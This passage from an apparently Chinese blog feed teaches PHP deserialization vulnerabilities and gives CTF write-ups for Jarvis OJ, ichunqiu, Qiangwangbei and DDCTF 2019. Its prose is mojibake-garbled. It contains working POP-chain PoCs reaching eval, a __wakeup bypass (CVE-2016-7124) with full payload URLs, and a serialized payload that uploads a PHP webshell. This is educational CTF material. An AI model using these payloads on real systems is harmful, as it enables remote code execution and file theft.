&quot;&lt;br/&gt;&quot;; var_dump(serialize($cc)); ?&gt;ÊâìÂç∞Âá∫Êù• string(5) &quot;i:66;&quot; string(13) &quot;s:6:&quot;String&quot;;&quot; string(4) &quot;b:1;&quot; string(2) &quot;N;&quot; string(30) &quot;a:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;}&quot; string(76) &quot;O:4:&quot;test&quot;:3:{s:4:&quot;data&quot;;s:5:&quot;peiqi&quot;;s:4:&quot;pass&quot;;b:1;s:7:&quot;CB_data&quot;;s:2:&quot;cb&quot;;}&quot;//Ê≥®ÊÑèÁßÅÊúâÂèòÈáèÂíåÂÖ±ÊúâÂèòÈáèÂå∫Âà´ÔºåÁªßÊâøÁöÑÂèòÈáèÂèØ‰ª•Â∫èÂàóÂåñ‰øùÂ≠òÔºå‰ΩÜÊòØÂ∏∏Èáè‰∏ç‰ºö‰øùÂ≠ò„ÄÇ‰∏∫‰ªÄ‰πàË¶ÅÁî®Â∫èÂàóÂåñÂ∫èÂàóÂåñÊòØÂ∞ÜÂèòÈáèËΩ¨Êç¢‰∏∫ÂèØ‰øùÂ≠òÊàñ‰º†ËæìÁöÑÂ≠óÁ¨¶‰∏≤ÁöÑËøáÁ®ãÔºõÂèçÂ∫èÂàóÂåñÂ∞±ÊòØÂú®ÈÄÇÂΩìÁöÑÊó∂ÂÄôÊääËøô‰∏™Â≠óÁ¨¶‰∏≤ÂÜçËΩ¨ÂåñÊàêÂéüÊù•ÁöÑÂèòÈáè‰ΩøÁî®„ÄÇËøô‰∏§‰∏™ËøáÁ®ãÁªìÂêàËµ∑Êù•ÔºåÂèØ‰ª•ËΩªÊùæÂú∞Â≠òÂÇ®Âíå‰º†ËæìÊï∞ÊçÆÔºå‰ΩøÁ®ãÂ∫èÊõ¥ÂÖ∑Áª¥Êä§ÊÄß„ÄÇ ÂÅáËÆæÊúâ‰∏™classÔºåËøô‰∏™classÈáåÈù¢Â≠òÊúâ‰∏Ä‰∫õÂèòÈáè„ÄÇÂΩìËøô‰∏™classË¢´ÂÆû‰æãÂåñ‰∫Ü‰πãÂêéÔºåÂú®‰ΩøÁî®ËøáÁ®ã‰∏≠ÈáåÈù¢ÁöÑ‰∏Ä‰∫õÂèòÈáèÂÄºÂèëÁîü‰∫ÜÊîπÂèò„ÄÇ‰ª•ÂêéÂú®Êüê‰∫õÊó∂ÂÄôËøò‰ºöÁî®Âà∞Ëøô‰∏™ÂèòÈáèÔºåÂ¶ÇÊûúÊàë‰ª¨ËÆ©Ëøô‰∏™class‰∏ÄÁõ¥‰∏çÈîÄÊØÅÔºåÁ≠âÁùÄ‰∏ã‰∏ÄÊ¨°Ë¶ÅÁî®ÂÆÉÁöÑÊó∂ÂÄôÂÜç‰∏ÄÊ¨°Ë¢´Ë∞ÉÁî®ÁöÑËØùÔºåÊµ™Ë¥πÁ≥ªÁªüËµÑÊ∫ê„ÄÇÂΩìÊàë‰ª¨ÂÜô‰∏Ä‰∏™Â∞èÂûãÁöÑÈ°πÁõÆÂèØËÉΩÊ≤°ÊúâÂ§™Â§ßÁöÑÂΩ±ÂìçÔºå‰ΩÜÊòØÈöèÁùÄÈ°πÁõÆÁöÑÂ£ÆÂ§ßÔºå‰∏Ä‰∫õÂ∞èÈóÆÈ¢òË¢´ÊîæÂ§ß‰∫Ü‰πãÂêéÂ∞±‰ºö‰∫ßÁîüÂæàÂ§öÈ∫ªÁÉ¶„ÄÇËøô‰∏™Êó∂ÂÄôPHPÂ∞±ÂíåÊàë‰ª¨ËØ¥Ôºå‰Ω†ÂèØ‰ª•ÊääËøô‰∏™ÂØπË±°Â∫èÂàóÂåñ‰∫ÜÔºåÂ≠òÊàê‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåÂΩì‰Ω†Ë¶ÅÁî®ÁöÑÊó∂ÂÄôÂÜçÊîæ‰ªñÂá∫Êù•Â∞±Â•Ω‰∫ÜÔºå‰πüÊ≠£ÊòØËøô‰∏™ÁâπÊÄß‰ΩøÂæóÂ≠òÂú®‰∫ÜPHPÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ Â∫èÂàóÂåñÊºèÊ¥ûË¶Å‰∫ÜËß£PHPÂèçÂ∫èÂàóÂåñÊºèÊ¥ûËá≥ÂÖ≥ÈáçË¶ÅÁöÑÊòØÂà©Áî®È≠îÊúØÊñπÊ≥ïÔºå‰∫ßÁîüÂ∫èÂàóÂåñÊºèÊ¥ûÂæÄÂæÄÊòØÊéßÂà∂‰∫ÜÂèÇÊï∞ÔºåË∞ÉÁî®‰∫ÜÈ≠îÊúØÊñπÊ≥ïÔºåÁÑ∂ÂêéÈÄ†ÊàêÊºèÊ¥û„ÄÇÈ≠îÊ≥ïÂáΩÊï∞‰∏ÄËà¨ÊòØ‰ª•__ÂºÄÂ§¥ÔºåÈÄöÂ∏∏‰ºöÂõ†‰∏∫Êüê‰∫õÊù°‰ª∂ËÄåËß¶Âèë‰∏çÁî®Êàë‰ª¨ÊâãÂä®Ë∞ÉÁî®„ÄÇ È≠îÊúØÊñπÊ≥ï1.__constructÔºå__destruct __constructÊûÑÂª∫ÂØπË±°ÁöÑÊó∂Ë¢´Ë∞ÉÁî®Ôºõ __destructÊòéÁ°ÆÈîÄÊØÅÂØπË±°ÊàñËÑöÊú¨ÁªìÊùüÊó∂Ë¢´Ë∞ÉÁî®Ôºõ 2.__getÔºå__set __setÂΩìÁªô‰∏çÂèØËÆøÈóÆÊàñ‰∏çÂ≠òÂú®Â±ûÊÄßËµãÂÄºÊó∂Ë¢´Ë∞ÉÁî® __getËØªÂèñ‰∏çÂèØËÆøÈóÆÊàñ‰∏çÂ≠òÂú®Â±ûÊÄßÊó∂Ë¢´Ë∞ÉÁî® 3.__issetÔºå__unset __issetÂØπ‰∏çÂèØËÆøÈóÆÊàñ‰∏çÂ≠òÂú®ÁöÑÂ±ûÊÄßË∞ÉÁî®isset()Êàñempty()Êó∂Ë¢´Ë∞ÉÁî® __unsetÂØπ‰∏çÂèØËÆøÈóÆÊàñ‰∏çÂ≠òÂú®ÁöÑÂ±ûÊÄßËøõË°åunsetÊó∂Ë¢´Ë∞ÉÁî® 4.__callÔºå__callStatic __callË∞ÉÁî®‰∏çÂèØËÆøÈóÆÊàñ‰∏çÂ≠òÂú®ÁöÑÊñπÊ≥ïÊó∂Ë¢´Ë∞ÉÁî® __callStaticË∞ÉÁî®‰∏çÂèØËÆøÈóÆÊàñ‰∏çÂ≠òÂú®ÁöÑÈùôÊÄÅÊñπÊ≥ïÊó∂Ë¢´Ë∞ÉÁî® 5.__sleepÔºå__wakeup __sleepÂΩì‰ΩøÁî®serializeÊó∂Ë¢´Ë∞ÉÁî®ÔºåÂΩì‰Ω†‰∏çÈúÄË¶Å‰øùÂ≠òÂ§ßÂØπË±°ÁöÑÊâÄÊúâÊï∞ÊçÆÊó∂ÂæàÊúâÁî® __wakeupÂΩì‰ΩøÁî®unserializeÊó∂Ë¢´Ë∞ÉÁî®ÔºåÂèØÁî®‰∫éÂÅö‰∫õÂØπË±°ÁöÑÂàùÂßãÂåñÊìç‰Ωú 6.__clone ËøõË°åÂØπË±°cloneÊó∂Ë¢´Ë∞ÉÁî®ÔºåÁî®Êù•Ë∞ÉÊï¥ÂØπË±°ÁöÑÂÖãÈöÜË°å‰∏∫ 7.__toString ÂΩì‰∏Ä‰∏™Á±ªË¢´ËΩ¨Êç¢ÊàêÂ≠óÁ¨¶‰∏≤Êó∂Ë¢´Ë∞ÉÁî® 8.__invoke ÂΩì‰ª•ÂáΩÊï∞ÊñπÂºèË∞ÉÁî®ÂØπË±°Êó∂Ë¢´Ë∞ÉÁî® 9.__set_state ÂΩìË∞ÉÁî®var_export()ÂØºÂá∫Á±ªÊó∂ÔºåÊ≠§ÈùôÊÄÅÊñπÊ≥ïË¢´Ë∞ÉÁî®„ÄÇÁî®__set_stateÁöÑËøîÂõûÂÄºÂÅö‰∏∫var_exportÁöÑËøîÂõûÂÄº„ÄÇ 10.__debuginfo ÂΩìË∞ÉÁî®var_dump()ÊâìÂç∞ÂØπË±°Êó∂Ë¢´Ë∞ÉÁî®ÔºàÂΩì‰Ω†‰∏çÊÉ≥ÊâìÂç∞ÊâÄÊúâÂ±ûÊÄßÔºâÈÄÇÁî®‰∫éPHP5.6ÁâàÊú¨‰∏æ‰æãÔºö &lt;?php class A{ var $test = &quot;test&quot;; function __destruct(){ echo $this-&gt;test; } } $a = $_GET[&apos;test&apos;]; $a_unser = unserialize($a); ?&gt;ÊûÑÈÄ†ÂèçÂ∫èÂàóÂåñpocÔºåÁÑ∂ÂêéËß¶ÂèëÈ≠îÊúØÊñπÊ≥ï__destruct()ÔºàÊòéÁ°ÆÈîÄÊØÅÂØπË±°ÊàñËÑöÊú¨ÁªìÊùüÊó∂Ë¢´Ë∞ÉÁî®Ôºâ, Ê≠£Â∏∏ËæìÂá∫Â∫îËØ•‰∏∫test„ÄÇ ÈÄöËøá‰ª£Á†ÅÊûÑÈÄ†poc &lt;? class A{ var $test = &quot;test&quot;; function __destruct(){ echo $this-&gt;test; } } $c= new A(); $c-&gt;test=&quot;123456&quot;; echo serialize($c); echo &quot;&lt;br/&gt;&quot;;echo &quot;&lt;br/&gt;&quot;; ?&gt;Ëé∑Âæó O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:6:&quot;123456&quot;;}ÊúÄÁªàÂèØ‰ª•‰ªªÊÑèÊéßÂà∂ËæìÂá∫ÁªìÊûú„ÄÇ ‰∏Ä‰∫õÈ≠îÊúØÊñπÊ≥ïÁöÑ‰ΩúÁî®„ÄÇ &lt;?php class test{ public $abc=123; var $test = &apos;123&apos;; function __wakeup(){ echo &quot;__wakeup&quot;; echo &quot;&lt;/br&gt;&quot;; } function __construct($filename = &apos;&apos;){ $this -&gt; abc = $filename; echo &quot;__construct&quot;; echo &quot;&lt;/br&gt;&quot;; } function __destruct(){ echo &quot;__destruct&quot;; echo &quot;&lt;/br&gt;&quot;; } function abc() { echo $this -&gt; abc ; } } $class2 = &apos;O:4:&quot;test&quot;:2:{s:3:&quot;abc&quot;;s:12:&quot;xiaozhupeiqi&quot;;s:4:&quot;test&quot;;s:3:&quot;123&quot;;}&apos;; $class2_unser = unserialize($class2); echo $class2_unser -&gt;abc(); echo &quot;&lt;/br&gt;&quot;; ?&gt;ÁªìÊûú„ÄÇ Áõ∏ÂêåÁöÑÂáΩÊï∞ÂêçÔºåÊûÑÈÄ†Âà©Áî®„ÄÇ &lt;?php class test { var $test1; function __construct() { $this-&gt;test = new xzpq(); } function __destruct() { $this-&gt;test-&gt;func(); } } class xzpq { function func() { echo &quot;serialize test&quot;; } } class xzpq1 { var $test2; function func() { eval($this-&gt;test2); } } $class = new test(); unserialize($_GET[&apos;test&apos;]); ?&gt;Ê≠£Â∏∏ÈìæÊòØnew test()ÂØπË±°ÔºåÁÑ∂ÂêéÈ≠îÊúØÊñπÊ≥ïË∞ÉÁî® $this-&gt;test = new xzpq(); ÁÑ∂Âêé‰∏ã‰∏Ä‰∏™È≠îÊúØÊñπÊ≥ïË∞ÉÁî®func()ÂáΩÊï∞ÊúÄÁªàËæìÂá∫serialize test Âà©Áî®:Âà©Áî®ÂèçÂ∫èÂàóÂåñËß¶ÂèëÁ¨¨‰∏Ä‰∏™È≠îÊúØÊñπÊ≥ïÔºåË¶ÜÁõñ‰ΩøÂÖ∂new xzpq1ÊñπÊ≥ïÔºåÁÑ∂ÂêéËá™Âä®Ë∞ÉÁî®Á¨¨‰∫å‰∏™funcÔºåÂú®ÊûÑÈÄ†pocÈáå‰º†ÂÖ•test2ÂÄºËææÂà∞‰ªªÊÑè‰ª£Á†ÅÊâßË°åÊºèÊ¥û„ÄÇ class test { var $test1; function __construct() { $this-&gt;test = new xzpq1(); } function __destruct() { $this-&gt;test-&gt;func(); } } class xzpq { function func() { echo &quot;serialize test&quot;; } } class xzpq1 { var $test2=&quot;phpinfo();&quot;; function func() { eval($this-&gt;test2); } } $class = new test(); echo serialize($class); ÂÆûÊàòCTF-webÈöæÂ∫¶0.1 url:http://web.jarvisoj.com:32768/index.php ÊØîËæÉÁÆÄÂçïÔºåËØªÂèñÊ∫êÁ†ÅÔºåËøôÂ∞±‰∏çËØ¥‰∫ÜËá™Â∑±ÂéªËØªÔºåÁÑ∂ÂêéËøôÊòØ‰∏â‰∏™Êñá‰ª∂Ê∫êÁ†Å„ÄÇ shield.php &lt;?php //flag is in pctf.php class Shield { public $file; function __construct($filename = &apos;&apos;) { $this -&gt; file = $filename; } function readfile() { if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) { return @file_get_contents($this-&gt;file); } } } ?&gt;index.php &lt;?php require_once(&apos;shield.php&apos;); $x = new Shield(); isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;]; if (!empty($g)) { $x = unserialize($g); } echo $x-&gt;readfile(); ?&gt; &lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;showimg.php &lt;?php $f = $_GET[&apos;img&apos;]; if (!empty($f)) { $f = base64_decode($f); if (stripos($f,&apos;..&apos;)===FALSE &amp;&amp; stripos($f,&apos;/&apos;)===FALSE &amp;&amp; stripos($f,&apos;\\&apos;)===FALSE &amp;&amp; stripos($f,&apos;pctf&apos;)===FALSE) { readfile($f); } else { echo &quot;File not found!&quot;; } } ?&gt;ÊµÅÁ®ãËß£ÊûêÔºö ÂæàÊòéÊòæÈúÄË¶Åindex.php ‰∏é shield.php ÁªìÂêàÔºå‰º†ÂÖ•classÂèçÂ∫èÂàóÂåñ‰∏≤Ôºå‰º†ÂÖ•ÂÆåÊàêÂêéËß¶Âèë__construct ÊñπÊ≥ïÔºåÊù•‰º†ÂÖ•fileÂÄºÔºåÁÑ∂ÂêéÂà©Áî® function readfile() { if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) { return @file_get_contents($this-&gt;file); }Êù•ËØªÂèñÊ∫êÁ†Å„ÄÇ ÊûÑÈÄ†pocÔºö &lt;?php class Shield { public $file; function __construct($filename = ‚Äò‚Äô) { $this -&gt; file = $filename; } function readfile() { if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) { return @file_get_contents($this-&gt;file); } } } $a=new shield(); $a-&gt;file=&quot;pctf.php&quot;; echo serialize($a); ?&gt; web1È¢òÁõÆÊâìÂºÄÔºö Âè≥ÈîÆÊü•ÁúãÊ∫êÁ†ÅÔºå ÂèëÁé∞ÊòØÊñá‰ª∂ÂåÖÂê´ÔºåÂπ∂‰∏îÊúâÊèêÁ§∫hint.php„ÄÇ ‰ΩøÁî®php://filter/read=convert.base64-encode/resource=index.php ÔºåÂàÜÂà´ËØªÂá∫index.phpÂíåhint.phpÊ∫êÁ†Å„ÄÇ index.php &lt;html&gt; &lt;?php error_reporting(0); $file = $_GET[&quot;file&quot;]; $payload = $_GET[&quot;payload&quot;]; if(!isset($file)){ echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;; } if(preg_match(&quot;/flag/&quot;,$file)){ die(&apos;hack attacked!!!&apos;); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]); parse_str($url[&apos;query&apos;],$query); foreach($query as $value){ if (preg_match(&quot;/flag/&quot;,$value)) { die(&apos;stop hacking!&apos;); exit(); } } $payload = unserialize($payload); }else{ echo &quot;Missing parameters&quot;; } ?&gt; &lt;!--Please test index.php?file=xxx.php --&gt; &lt;!--Please get the source of hint.php--&gt; &lt;/html&gt;hint.php &lt;?php class Handle{ private $handle; public function __wakeup(){ foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo &quot;Waking up\n&quot;; } public function __construct($handle) { echo 123; $this-&gt;handle = $handle; } public function __destruct(){ echo 456; $this-&gt;handle-&gt;getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); } public function getFlag(){ echo &quot;666&quot;; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) { if(isset($this-&gt;file)){ echo @highlight_file($this-&gt;file,true); } } } } ?&gt;index.php‰∏≠ÂèØ‰ª•‰º†ÂèÇ‰∏§‰∏™ÂèÇÊï∞ÔºåÂπ∂‰∏îÊúâÊòéÊòæÁöÑÂèçÂ∫èÂàóÂåñÂáΩÊï∞unserializeÔºåÂ∫îËØ•ÊòØÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÂú®È¶ñÂÖàfileÂåÖÂê´hint.phpÊâçËÉΩË∞ÉÁî®classËØªÂèñflag.php„ÄÇ‰ΩÜÊòØÊó†Ê≥ïËØªÂèñflag.phpÔºåÊúâÊòéÊòæÁöÑÊ≠£ÂàôÊã¶Êà™„ÄÇ parse_str($url[&apos;query&apos;],$query); foreach($query as $value){Â∞ÜÂΩìÂâçËµãÂÄºÁªôÁΩëÁ´ôÂèÇÊï∞ÂÄºËµãÂÄºÁªôvalueÔºå‰ΩøÁî®ÂèåÊñúÁ∫ø‰ΩøÂæó$url[‚Äòquery‚Äô]Êó†ÊïàÔºåÁªïËøáÁ¨¨‰∫å‰∏™ËøáÊª§„ÄÇ ÂèçÂ∫èÂàóÂåñËß£ÊûêÔºö ‰º†ÂÖ•payload‰ºöË¢´ÂèçÂ∫èÂàóÂåñÔºå‰º†ÂÖ•ÁâπÂÆöÂ∫èÂàóÂåñÂèÇÊï∞ÔºåÂÆû‰æãÂåñHandleÁ±ªÔºå‰º†ÂÖ•$handleÂèÇÊï∞ÂÆû‰æãÂåñclass FlagÔºåÂú®HandleÁ±ªÈáåÈîÄÊØÅÊó∂Ë∞ÉÁî®È≠îÊ≥ïÂáΩÊï∞function __destruct()Ë∞ÉÁî®$this-&gt;handle-&gt;getFlag();Êù•ÊâßË°åflagÂáΩÊï∞ÔºåFlagÁ±ªÈúÄË¶Å‰º†ÂÖ•fileÂèÇÊï∞ÔºåËøôÈáå‰º†ÂÖ•flag.php‰ª£Á†ÅÔºå‰ªéËÄåËØªÂèñflag.phpÁöÑÊ∫êÁ†ÅËé∑Âæóflag„ÄÇ Âú®hint.php ÁîüÊàêÂ∫èÂàóÂåñpayload„ÄÇÂä†ÂÖ•‰ª•‰∏ã‰ª£Á†Å #$a = new Flag(&apos;./flag.php&apos;); #$test = new Handle($a); #echo serialize($test);ÂÖ∂‰∏≠handleÊòØprivateÊâÄ‰ª•ÈúÄË¶ÅÊîπÊàê%00Handle%00handleÔºåÂèå//ÁªïËøávalueÊã¶Êà™flagÂ≠óÊÆµ„ÄÇÊúÄÁªàpayloadÔºåÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄô‰ºöË∞ÉÁî®wakeupÊñπÊ≥ïÔºåÁªïËøáÊñπÂºè„ÄÇ wakeupÊñπÊ≥ï(CVE-2016-7124) O:6:&quot;sercet&quot;:1: ‰πüÂ∞±ÊòØËæìÂÖ•ÊØî1Â§ßÁöÑÂÄºÂ∞±Ë°å Â¶ÇO:6:&quot;sercet&quot;:2: ÊúÄÁªàpayload http://604abe9ee70d4acab8aea61f547235a56c60f822bc734cf3.changame.ichunqiu.com//index.php?file=hint.php&amp;payload=O:6:%22Handle%22:2:{s:14:%22%00Handle%00handle%22;O:4:%22Flag%22:3:{s:4:%22file%22;s:10:%22./flag.php%22;s:5:%22token%22;s:32:%22ab4c389364232588a6680ad92ec170c7%22;s:10:%22token_flag%22;s:32:%22ab4c389364232588a6680ad92ec170c7%22;}}Áõ¥Êé•ËÆøÈóÆËØ∑Ê±ÇÂç≥ÂèØËÑöÊú¨Ë∑ëÂá∫md5ÔºåÊåâÊ¶ÇÁéáÂ≠¶Êù•ËØ¥‰∏Ä‰∏á‰∏™Â∞±ËÉΩÁôæÂàÜÁôæË∑ëÂá∫Êù•„ÄÇÁõ∏Á≠âÂç≥ÂèØËé∑Âæóflag„ÄÇ Âº∫ÁΩëÊùØ‚ÄìuploadËÆøÈóÆ www.tar.gz ‰∏ãËΩΩÊ∫êÁ†Å„ÄÇ Âõõ‰∏™Ê†∏ÂøÉÊñá‰ª∂Ôºå‰∏ä‰º†ÂèëÁé∞ÊòØ‰∏ä‰º†‰πãÂêéÂÖ®ÈÉ®ÈáçÊñ∞ÂëΩÂêçÔºåÊúçÂä°Âô®ÂëΩÂêçÂêéÁºÄÊó†Ê≥ïÁªïËøáÔºå‰ΩÜÊòØÊúâÂ∫èÂàóÂåñÂáΩÊï∞ÔºåÊé®Êñ≠ÂæàÂèØËÉΩÊòØÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ ÂèëÁé∞profileÊñá‰ª∂ÈáåÁöÑcallÈ≠îÊúØÊñπÊ≥ï„ÄÇ public function __call($name, $arguments) { if($this-&gt;{$name}){ $this-&gt;{$this-&gt;{$name}}($arguments); } }Âà©Áî®Ëøô‰∏ÄË°å$this-&gt;{$this-&gt;{$name}}($arguments); Â¶ÇÊûúÂèØ‰ª•ÊéßÂà∂name‰ª•ÂèäargumentsÂÄºÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•Ë∞ÉÁî®‰ªªÊÑèÊñπÊ≥ï‰∫Ü„ÄÇ ÂèëÁé∞upload‰∏≠ÊúâÂèØ‰ª•Âà©Áî®ÁöÑÁÇπ„ÄÇ@copy($this-&gt;filename_tmp, $this-&gt;filename);ÔºåÂ¶ÇÊûúËøôÂêéÈù¢ÁöÑÂèÇÊï∞ÂèØÊéßÔºåÈÇ£‰πàÊàë‰πàÂ∞±ÂèØ‰ª•‰ªªÊÑèÊéßÂà∂ÂëΩÂêç„ÄÇÂ∞±ÂèØ‰ª•‰∏ä‰º†PHPÊñá‰ª∂ÔºåÈÇ£‰πàÂ∞±ÈúÄË¶ÅÁªïËøáËøô‰∏™ÁÇπ„ÄÇ if(!empty($_FILES)){ $this-&gt;filename_tmp=$_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $this-&gt;filename=md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;; $this-&gt;ext_check(); }ÈÇ£‰πàÊú¨È¢òÂ∞±ÊòØÁªïËøáemptyÊ£ÄÊµãÔºåÁÑ∂ÂêéÂà©Áî®È≠îÊúØÊñπÊ≥ïË∞ÉÁî®upload_imgËøõË°å‰∏ä‰º†„ÄÇ ÈÇ£‰πà‰∏ã‰∏ÄÊ≠•ÂØªÊâæÂèçÂ∫èÂàóÂåñÁÇπÔºåÂèëÁé∞‰ºöÂ∞ÜÊàë‰ª¨ÁöÑcookieÂèçÂ∫èÂàóÂåñ if(!empty($profile)){ $this-&gt;profile=unserialize(base64_decode($profile)); $this-&gt;profile_db=db(&apos;user&apos;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&apos;ID&apos;]))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null){ return 1; }else{ return 0; } }Ë¶ÅËøõÂÖ•callÈ≠îÊúØÊñπÊ≥ïÈúÄË¶ÅÊù°‰ª∂„ÄÇÂΩìË∞ÉÁî®Á±ª‰∏≠‰∏çÂ≠òÂú®ÁöÑÊñπÊ≥ïÊó∂ÔºåÂ∞±‰ºöË∞ÉÁî®__call(); Â¶ÇÊàë‰ª¨ÊéßÂà∂ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤Ôºå‰Ωø‰πãÂèçÂ∫èÂàóÂåñRegisterÁ±ªÔºåÊéßÂà∂$this-&gt;checker‰∏∫ProfileÁ±ªÔºåÂ∞±ÂèØ‰ª•ÂØπProfileÁ±ªË∞ÉÁî®index()ÊñπÊ≥ïÔºåËÄåÂú®ProfileÁ±ª‰∏≠‰∏çÂ≠òÂú®Ê≠§ÊñπÊ≥ïÔºåÂ∞±‰ºöËøõÂÖ•__callÊñπÊ≥ïÔºåÁÑ∂ÂêécallÊñπÊ≥ïÁõ¥Êé•Ë∞ÉÁî® upload_img() ÂáΩÊï∞Ôºå‰ªéËÄå‰∏ä‰º†„ÄÇ‰ΩÜÊòØ ‰ª£Á†Å‰∏ÄÔºö$this-&gt;checker-&gt;index(); ‰ª£Á†Å‰∫åÔºö$this-&gt;{$this-&gt;{$name}}($arguments);ËøôÈáåË∞ÉÁî®ÁöÑÊòØProfile-&gt;index(),Êó†Ê≥ïÊéßÂà∂ÔºåÊâÄ‰ª•Ê≠§Êó∂ÈúÄË¶ÅÂØªÊâæÂèØ‰ª•Ë∞ÉÁî®ÂèØÊéßÁöÑÊñπÊ≥ïÔºåÂõ†‰∏∫index()ÊñπÊ≥ï‰∏çÂ≠òÂú®ÔºåÊâÄ‰ª•Ë∞ÉÁî®È≠îÊúØÊñπÊ≥ï public function __get($name) //Â¶ÇÊûúË∞ÉÁî®ÁöÑÂèòÈáèÂ±ûÊÄß‰∏çÂ≠òÂú®ÔºåÂèçÂ∫èÂàóÂåñÂ∞±‰ºöÈªòËÆ§Ë∞ÉÁî®__get()ÊñπÊ≥ïÔºå$nameÊòØÂ±ûÊÄßÂêç { return $this-&gt;except[$name]; }ÁÑ∂Âêé‰º†ÂÖ•ÂèØÊéßÂèòÈáè$this-&gt;except[$name]; ÁÑ∂Âêé‰º†ÂÖ•upload_imgÔºåÊúÄÁªàË∞ÉÁî®upload_imgÂáΩÊï∞ÔºåÁÑ∂ÂêéÂú®Ë¶ÜÁõñÂèòÈáèÔºå $pro-&gt;filename_tmp = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/b1a224c24d78e208556d6206b9ec7c72.png&apos;; $pro-&gt;filename = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/gurenmeng.php&apos;;ÁÑ∂ÂêéÂ∞±ËÉΩÊúÄÁªà‰∏ä‰º†‰∏äÂéªphpÊñá‰ª∂„ÄÇ payload: &lt;?php namespace app\web\controller; class Profile{ public $ext; public $filename_tmp; public $filename; public $except; } class Register{ public $checker; public $registed; } $reg = new Register(); $pro = new Profile(); $pro-&gt;except = array(&apos;index&apos;=&gt;&apos;upload_img&apos;); $pro-&gt;ext = 1; $pro-&gt;filename_tmp = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/b1a224c24d78e208556d6206b9ec7c72.png&apos;; $pro-&gt;filename = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/gurenmeng.php&apos;; $reg-&gt;checker = $pro; $reg-&gt;registed = 0; echo base64_encode(serialize($reg)); ?&gt;Êî∂ËóèÊñáÁ´†Ôºöhttps://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ ÂèÇËÄÉÔºöhttps://www.cnblogs.com/youyoui/p/8610068.htmlÂèÇËÄÉÔºöhttps://www.freebuf.com/articles/web/167721.html]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019DDCTF]]></title>
    <url>%2F2019%2F04%2F14%2F2019DDCTF%2F</url>
    <content type="text"><![CDATA[Êª¥ ËøõÂÖ•È¢òÁõÆÔºåËßÇÂØüurl http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09ÊØîËæÉÊòéÊòæÂ∫îËØ•ÊòØbase64ÁºñÁ†Å‰∫Ü„ÄÇ ‰∏§Ê¨°base64Ëß£Á†Å„ÄÇ 666C61672E6A7067 Â∫îËØ•‰∏∫16ËøõÂà∂ÔºåÁõ¥Êé•ÂçÅÂÖ≠ËøõÂà∂ËΩ¨ÂåñÂ≠óÁ¨¶‰∏≤„ÄÇ Âè™Ë¶ÅÊñá‰ª∂Â≠òÂú®Â∫îËØ•Â∞±ÂèØ‰ª•ËØªÂèñÊñá‰ª∂ÔºådirsearchÊâ´ÊèèÁõÆÂΩï„ÄÇ Â∞ùËØïËØªÂèñindex.phpÊñá‰ª∂ÔºåÊü•ÁúãÊ∫êÁ†Å„ÄÇÂèëÁé∞base64ÁöÑ dataÊï∞ÊçÆÊµÅ„ÄÇ Ëß£Á†Åbase64ÂæóÂà∞Ê∫êÁ†Å„ÄÇ &lt;?php /* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */ error_reporting(E_ALL || ~E_NOTICE); header(&apos;content-type:text/html;charset=utf-8&apos;); if(! isset($_GET[&apos;jpg&apos;])) header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;); $file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;]))); echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;; $file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file); echo $file.&apos;&lt;/br&gt;&apos;; $file = str_replace(&quot;config&quot;,&quot;!&quot;, $file); echo $file.&apos;&lt;/br&gt;&apos;; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;; /* * Can you find the flag file? * */ 